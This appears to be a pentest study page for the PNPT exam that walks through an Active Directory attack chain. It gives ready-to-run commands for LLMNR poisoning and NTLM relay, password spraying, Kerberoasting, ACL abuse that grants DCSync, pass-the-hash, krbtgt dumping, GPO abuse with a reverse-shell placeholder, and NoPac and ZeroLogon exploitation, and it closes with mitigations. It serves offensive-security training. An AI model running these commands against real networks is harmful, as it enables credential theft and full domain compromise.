# Active Directory Attacks

The PNPT internal exam lives in Active Directory. You start unauthenticated on the network and finish as Domain Admin (or Enterprise Admin) — and the path is almost always the same shape: **get a foothold → enumerate everything → find a misconfiguration → escalate → own the domain**. This page is the map of that chain. It links out to the deep-dive pages for each technique; read [Active Directory](AD.md) first for the concepts (forests, domains, trusts, tickets).

{% hint style="info" %}
The whole game is turning *some* credential (a captured hash, a sprayed password, a service ticket) into a *better* credential, over and over, until one of them is Domain Admin. Every box below feeds the next. Collect everything, [BloodHound](#enumerate-with-bloodhound) it, and follow the shortest path.
{% endhint %}

## The kill chain

| Phase | Goal | Key techniques |
| --- | --- | --- |
| **1. Foothold** | First set of domain creds | [LLMNR/NBT-NS poisoning](#llmnrnbt-ns-poisoning), [SMB/LDAP relay](relay-and-coerce.md), [AS-REP roasting](kerberos-attacks.md#as-rep-roasting), password spray |
| **2. Enumerate** | Map users, groups, ACLs, trusts | [BloodHound](#enumerate-with-bloodhound), [PowerView](#powerview--sharpview), [ldapsearch/NetExec](crackmapexec-netexec.md) |
| **3. Credentialed escalation** | A more privileged account | [Kerberoasting](kerberos-attacks.md#kerberoasting), [ACL abuse](acl-abuse.md), [ADCS](adcs-attacks.md), [GPP passwords](#gpp-passwords-cpassword) |
| **4. Lateral movement** | Land on more hosts | [Pass-the-Hash](password-hash-attacks.md), [PtT](kerberos-attacks.md#pass-the-ticket-ptt), [psexec/wmiexec](lateral-movement.md) |
| **5. Domain dominance** | Domain / Enterprise Admin | [DCSync](#dcsync--dump-the-ntdsdit), [delegation abuse](kerberos-attacks.md#constrained-delegation-s4u2proxy), [golden ticket](kerberos-attacks.md#golden-ticket), [ExtraSids](kerberos-attacks.md#child--parent-domain-escalation-extrasids) |

---

## Phase 1 — Initial foothold (no credentials yet)

You're on the wire with no account. The goal is one valid credential or one crackable hash.

### LLMNR/NBT-NS poisoning

When DNS fails, Windows falls back to LLMNR and NBT-NS broadcasts — answer them and clients hand you their NTLMv2 hash. Run Responder, wait for a mistyped share or a login event, then crack offline.

```bash
sudo responder -I <INTERFACE> -dwP
# captured hashes land in /usr/share/responder/logs/
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

If SMB signing is off on other hosts, don't crack — **relay** the hash instead (see [Relay and Coerce](relay-and-coerce.md)):

```bash
# Find targets with signing disabled
netexec smb <SUBNET>/24 --gen-relay-list relay.txt
# Turn off SMB+HTTP in /etc/responder/Responder.conf first, then:
sudo responder -I <INTERFACE>
impacket-ntlmrelayx -tf relay.txt -smb2support -i   # -i = interactive shell
```

### Build a user list, then spray

No creds, but you can name-enumerate over Kerberos (stealthy — pre-auth failures, not logon failures) and spray safely.

```bash
# Anonymous / null-session user enum
enum4linux-ng -A <DC_IP>
rpcclient -U "" -N <DC_IP> -c enumdomusers
netexec smb <DC_IP> -u '' -p '' --rid-brute

# Kerberos username validation from a name list (no lockout)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid.txt

# Check the lockout policy BEFORE spraying
netexec smb <DC_IP> -u '' -p '' --pass-pol       # LockoutBadCount 0 = unlimited

# Spray one password across all valid users
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid.txt 'Winter2024!'
```

{% hint style="warning" %}
Safe spray formula: **max sprays = lockout threshold − 2**, and wait **reset-counter + 1 minute** between rounds. Query `badPwdCount` against the **PDC Emulator** — other DCs lag. Default lockout threshold is 0 (unlimited) on a fresh domain.
{% endhint %}

### Other no-cred footholds

* **[AS-REP roasting](kerberos-attacks.md#as-rep-roasting)** — any account with pre-auth disabled yields a crackable hash with no credentials.
* **[Coercion + relay](relay-and-coerce.md)** — PetitPotam / PrinterBug force a DC or server to authenticate to you; relay to LDAP or [ADCS](adcs-attacks.md#esc8--http-web-enrollment-relay).
* **IPv6/mitm6** — spoof DHCPv6/WPAD, relay to LDAPS. See [Relay and Coerce](relay-and-coerce.md).
* **NULL/anonymous shares** — `smbclient -N -L //<DC_IP>`; check `SYSVOL`, `Replication`, `profiles$`.

---

## Phase 2 — Post-compromise enumeration

You have one domain account. Now map the domain so you can find the shortest path to DA. Broad tool coverage lives in [CrackMapExec / NetExec](crackmapexec-netexec.md); the essentials:

### Enumerate with BloodHound

BloodHound turns the domain into a graph and finds attack paths (ACL chains, delegation, sessions) you'd never spot by hand. Collect, then run the pre-built and Cypher queries.

```bash
# Python collector (Linux) — BloodHound CE
bloodhound-ce-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c all --zip
# NTLM-blocked domain: add -k

# Legacy BloodHound schema
bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c all --zip
```

```cmd
:: Windows collector — SharpHound
.\SharpHound.exe -c All,CARegistry,DCRegistry,CertServices
:: Stealth: throttle + jitter + random filenames
.\SharpHound.exe -c All,GPOLocalGroup --randomfilenames --throttle 10000 --jitter 23
```

**What to check first:** machine accounts in privileged groups, nested paths to Domain Admins, `LockoutBadCount = 0`, GPO-granted privileges, unconstrained/constrained delegation, and DCSync-capable principals. Useful raw Cypher:

```cypher
// DCSync-capable principals
MATCH p=()-[:DCSync|AllExtendedRights|GenericAll]->(:Domain) RETURN p
// Every user with a description (creds hide here)
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.samaccountname, u.description
// Constrained delegation
MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p
```

### PowerView / SharpView

The Swiss-army knife from a Windows foothold. `SharpView.exe` is the compiled port for when Constrained Language Mode or AppLocker blocks `.ps1`.

```powershell
Import-Module .\PowerView.ps1

Get-NetDomain; Get-DomainSID; Get-DomainPolicy
Get-NetUser | select cn,description                 # descriptions = password goldmine
Get-DomainUser -SPN | select samaccountname,serviceprincipalname     # Kerberoastable
Get-DomainUser -PreauthNotRequired                   # AS-REP roastable
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Find-DomainShare -CheckShareAccess
Find-InterestingDomainAcl -ResolveGUIDs              # abusable ACEs
Get-DomainTrustMapping                               # all trusts, both directions
Find-LocalAdminAccess                                # where am I admin?
Invoke-UserHunter                                    # where are DAs logged in?
```

### From Linux (credentialed)

```bash
# Full HTML/JSON domain dump
ldapdomaindump -u "<DOMAIN>\<USER>" -p '<PASSWORD>' <DC_IP> -o ldap_dump/

# Descriptions often hold passwords — always check
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' \
  -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=user)(description=*))" sAMAccountName description

# Broad sweep + shares + sessions
netexec smb <SUBNET>/24 -u <USER> -p '<PASSWORD>' --shares --sessions
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M spider_plus       # hunt files
```

{% hint style="info" %}
A `(Pwn3d!)` next to a host in NetExec/CME means your creds have **local admin** there — you can dump SAM/LSASS and pull more credentials. See [Credential Dumping](credential-dumping.md).
{% endhint %}

### Well-known RIDs & high-value groups

| RID | Object | | Group | Why it matters |
| --- | --- | --- | --- | --- |
| 500 | Administrator | | Domain Admins | Full domain control |
| 502 | krbtgt | | Enterprise Admins | Full forest control |
| 512 | Domain Admins | | Backup Operators | Backup/restore any file (bypass DACL) → DC |
| 519 | Enterprise Admins | | Account Operators | Create/modify most accounts |
| 516 | Domain Controllers | | DNSAdmins | Load arbitrary DLL into DNS (often on DC) |

---

## Phase 3 — Credentialed privilege escalation

You have a foothold account. Turn it into a better one. These are the workhorses — each has its own detail page.

### Kerberoasting & AS-REP roasting

Any domain user can request a service ticket for accounts with SPNs and crack them offline; pre-auth-disabled accounts give up hashes with no creds at all. Full syntax (Impacket, Rubeus, PowerView, NetExec, all Hashcat modes) in **[Kerberos Attacks](kerberos-attacks.md)**.

```bash
# Kerberoast
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
hashcat -m 13100 tgs.hash rockyou.txt

# AS-REP roast
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat
hashcat -m 18200 asrep.hash rockyou.txt
```

### ACL / DACL abuse

Misconfigured object permissions (`GenericAll`, `WriteDACL`, `ForceChangePassword`, `WriteOwner`) are the most common escalation on modern boxes — BloodHound draws the chain, you walk it. Full playbook in **[ACL Abuse](acl-abuse.md)**.

```powershell
# ForceChangePassword
$p = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET> -AccountPassword $p
# WriteDACL on domain root → grant self DCSync
Add-DomainObjectAcl -TargetIdentity "DC=<DOMAIN>,DC=<TLD>" -PrincipalIdentity <USER> -Rights DCSync
```

### ADCS (certificate services)

A vulnerable template or over-permissive CA is a straight line to DA, plus certificate-based persistence. Full ESC1–16 in **[ADCS Attacks](adcs-attacks.md)**.

```bash
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
```

### GPP passwords (cpassword)

Group Policy Preferences historically stored credentials in SYSVOL encrypted with a Microsoft-published AES key. Any authenticated user can read and decrypt them.

```bash
# Find and decrypt Groups.xml in SYSVOL/Replication
smbclient //<DC_IP>/Replication -N -c 'recurse ON; ls'
gpp-decrypt "<CPASSWORD_VALUE>"
# Or via module
netexec smb <DC_IP> -u <USER> -p '<PASS>' -M gpp_password
```

### LAPS, gMSA & other credential sources

* **LAPS** — random per-machine local admin password in `ms-Mcs-AdmPwd`; readable if you have ExtendedRight: `nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M laps`.
* **gMSA** — machine-managed account passwords readable by principals in `msDS-GroupMSAMembership`: `nxc ldap <DC_IP> -u <USER> -p '<PASS>' --gmsa`.
* **Snaffler / share spidering** — creds in configs, scripts, `web.config`, `unattend.xml`.

### Token impersonation (from a shell)

On a host where you have a privileged token (service accounts with `SeImpersonatePrivilege`), impersonate it.

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token <DOMAIN>\\administrator
```

---

## Phase 4 — Lateral movement

Reuse credentials and tickets to land on more hosts, hunting for one where a Domain Admin is logged in or where you can dump more secrets. Full tooling in **[Lateral Movement](lateral-movement.md)** and **[Password / Hash Attacks](password-hash-attacks.md)**.

```bash
# Pass-the-Hash sweep
netexec smb <SUBNET>/24 -u administrator -H <NTLM_HASH> --local-auth
# Execute (SYSTEM shell)
psexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET>     # quieter, no service
```

| Tool | Protocol | Shell | Stealth |
| --- | --- | --- | --- |
| `psexec.py` | SMB 445 | SYSTEM | Low (writes binary, makes service) |
| `wmiexec.py` | WMI 135 | user | Medium (no disk artifact) |
| `smbexec.py` | SMB 445 | SYSTEM | Low (creates service) |
| `atexec.py` | Task Sched 135 | one command | Medium |
| `evil-winrm` | WinRM 5985 | user | Medium |

Dump credentials on each new host you own — [Credential Dumping](credential-dumping.md) (Mimikatz `sekurlsa::logonpasswords`, LSASS, SAM/LSA) — and repeat Phase 2 with the new material. Watch for the [Kerberos double-hop problem](kerberos-attacks.md#pass-the-ticket-ptt) in WinRM sessions.

---

## Phase 5 — Domain dominance

One of your credentials is now Domain Admin (or holds replication rights, or controls a DC). Cash it out and set up persistence.

### DCSync — dump the NTDS.dit

Replicate every account's hash from the DC without touching disk — the fastest full-domain credential harvest.

```bash
# With DA or delegated replication rights
secretsdump.py <DOMAIN>/<ADMIN>:'<PASS>'@<DC_IP> -just-dc
secretsdump.py <DOMAIN>/<ADMIN>@<DC_IP> -just-dc-user <DOMAIN>/krbtgt   # just KRBTGT
```

```powershell
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

### Persistence & forest escalation

* **[Golden ticket](kerberos-attacks.md#golden-ticket)** — forge TGTs with the KRBTGT hash; valid until KRBTGT is rotated twice.
* **[Silver ticket](kerberos-attacks.md#silver-ticket)** — forge a service ticket offline with a service/machine hash; no DC contact.
* **[ExtraSids / child→parent](kerberos-attacks.md#child--parent-domain-escalation-extrasids)** — escalate from child-domain DA to Enterprise Admin (in-forest SID filtering is off by default).
* **[Golden Certificate](adcs-attacks.md#golden-certificate-persistence)** — steal the CA key, forge certs forever (survives password + KRBTGT resets).
* **DSRM / Skeleton Key / AdminSDHolder** — DC-level persistence primitives.

### Cross-domain / cross-forest

Enumerate trusts (`Get-DomainTrustMapping`) and pivot. In-forest child→parent uses ExtraSids; forest trusts have SID filtering, so look for cross-forest ACEs in BloodHound instead. See [Kerberos Attacks](kerberos-attacks.md) for the ticket mechanics.

---

## GPO abuse

A writable GPO (or `WriteProperty`/`WriteDacl` on one) is code execution across every computer or user in the linked OU. GPOs refresh every ~90 minutes, or force with `gpupdate /force`.

```powershell
# Find GPOs you can modify
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll|GenericWrite"}

# Weaponize
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO_NAME>"
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators <USER> /add" --GPOName "<GPO_NAME>"
```

```bash
# Linux
./pygpoabuse.py <DOMAIN>/<USER> -hashes lm:nt -gpo-id "<GPO_GUID>" -powershell -command "<REVSHELL_CMD>"
```

---

## Named CVE fast-paths

Cheap wins to check early — several take you straight to SYSTEM/DA:

* **NoPac (CVE-2021-42278/42287)** — any domain user → SYSTEM on the DC. `noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOST> -shell --impersonate administrator`
* **PrintNightmare (CVE-2021-34527)** — Print Spooler RCE with standard creds. Check: `rpcdump.py @<TARGET> | egrep 'MS-RPRN|MS-PAR'`
* **PetitPotam + ADCS (CVE-2021-36942)** — unauthenticated coercion → relay to ADCS → DC takeover. See [ADCS](adcs-attacks.md#esc8--http-web-enrollment-relay) and [Relay and Coerce](relay-and-coerce.md).
* **ZeroLogon (CVE-2020-1472)** — resets the DC machine password to null → instant DA (destructive; note it in scope).
* **Certifried (CVE-2022-26923)** — machine-account cert → DC impersonation. See [ADCS](adcs-attacks.md#certifried-cve-2022-26923).

---

## Mitigations (for the report)

* Disable LLMNR/NBT-NS; enforce SMB signing everywhere (kills poisoning + relay).
* Long passwords / gMSAs for service accounts; AES-only Kerberos; kill RC4.
* Least privilege on ACLs; tier admin accounts; keep machine accounts out of privileged groups.
* Patch NoPac / PrintNightmare / ZeroLogon / PetitPotam; harden ADCS templates and disable HTTP web enrollment.
* LAPS for local admin passwords; remove GPP cpassword remnants from SYSVOL.
* Rotate KRBTGT twice on suspected golden-ticket compromise; monitor DCSync from non-DC hosts.

## Related

* [Active Directory](AD.md) — the concepts (forests, domains, trusts, tickets) behind everything here
* [Kerberos Attacks](kerberos-attacks.md) — Kerberoasting, AS-REP, golden/silver tickets, delegation, RBCD
* [ACL Abuse](acl-abuse.md) — GenericAll/WriteDACL/WriteOwner chains to DA
* [ADCS Attacks](adcs-attacks.md) — ESC1–16 certificate escalation and persistence
* [Relay and Coerce](relay-and-coerce.md) — Responder, ntlmrelayx, PetitPotam/PrinterBug, mitm6
* [CrackMapExec / NetExec](crackmapexec-netexec.md) — the enumeration + spray + sweep workhorse
* [Mimikatz](mimikatz.md) · [Credential Dumping](credential-dumping.md) — pulling secrets from every host you own
* [Lateral Movement](lateral-movement.md) · [Password / Hash Attacks](password-hash-attacks.md) — reusing what you dump
* [Report Writing](report-writing.md) — turning the chain into a rated, reproducible finding
